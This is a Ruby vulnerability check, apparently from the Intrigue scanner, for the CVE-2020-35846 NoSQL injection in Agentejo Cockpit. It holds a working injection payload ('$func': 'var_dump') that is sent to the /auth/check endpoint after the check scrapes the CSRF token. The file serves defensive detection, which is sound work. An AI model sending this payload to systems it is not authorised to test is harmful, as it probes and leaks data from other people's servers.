
module Intrigue

  module Issue
    class AgentejoCockpitCve202035846 < BaseIssue
      def self.generate(instance_details={})
      {
        added: "2021-04-14",
        name: "agentejo_cockpit_cve_2020_35846",
        pretty_name: "Agentejo Cockpit NoSQL Injection (CVE-2020-35846)",
        identifiers: [
          { type: "CVE", name: "CVE-2020-35846" }
        ],
        severity: 1,
        category: "vulnerability",
        status: "confirmed",
        description: "Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php check function.",
        affected_software: [ 
          { :vendor => "Agentejo", :product => "Agentejo" }
        ],
        references: [
          { type: "description", uri: "https://nvd.nist.gov/vuln/detail/CVE-2020-35846" },
          { type: "exploit", uri: "https://swarm.ptsecurity.com/rce-cockpit-cms/" }
        ],
        authors: ["Nikita Petrov", "PT Swarm", "shpendk"]
      }.merge!(instance_details)
      end
    end
  end

  module Task
    class AgentejoCockpitCve202035846 < BaseCheck 
    def self.check_metadata
      {
        allowed_types: ["Uri"]
      }
    end

    # return truthy value to create an issue
    def check
      
      # obtain csrf token
      uri = "#{_get_entity_name}"
      res = http_get_body uri

      csrf_token_parts = res.scan(/(csrf|csfr) : "(.*)"/).first # some older versions have a typo in "csrf"
      if csrf_token_parts.length() < 2
        _log_error "Failed to retrieve csrf token. Will try without it"
        use_csrf_token = false
      else
        csrf_name = csrf_token_parts[0]
        csrf_token = csrf_token_parts[1]
        use_csrf_token = true
      end
      
      # perform check
      uri_obj = URI(uri)
      vuln_uri = "#{uri_obj.scheme}://#{uri_obj.hostname}:#{uri_obj.port}/auth/check"
      data = {
        "auth": {
          "user": {
            "$func": "var_dump"
          },
          "password": [
            0
          ]
        }
      }
      if use_csrf_token
        data[csrf_name] = csrf_token
      end
      headers = {"Content-Type": "application/json"}
      response = http_request :post , vuln_uri, nil, headers, data.to_json, true, 60
      if response.response_body =~ /string\(\d\)/
        return response.response_body
      end
      

      
    end

    end
  end
  
end
